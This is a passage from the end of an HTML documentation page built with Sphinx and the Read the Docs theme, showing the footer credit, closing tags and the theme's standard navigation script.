    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>